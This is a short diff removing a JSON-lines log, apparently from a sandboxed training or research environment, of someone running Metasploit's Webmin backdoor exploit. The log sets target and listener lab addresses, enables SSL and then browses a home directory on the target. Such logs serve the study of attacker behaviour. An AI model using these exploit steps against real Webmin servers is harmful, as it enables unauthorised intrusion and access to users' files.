@@ -1,7 +1,0 @@
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:29:46.893Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmib_backdoor"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:30:20.135Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:30:59.182Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 10.1.26.9"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:31:34.280Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:31:38.221Z", "cmd_type": "msf-command", "cmd": "set SSL true"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:33:03.090Z", "cmd_type": "msf-command", "cmd": "ls"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T16:33:26.867Z", "cmd_type": "msf-command", "cmd": "cd home/chong"}
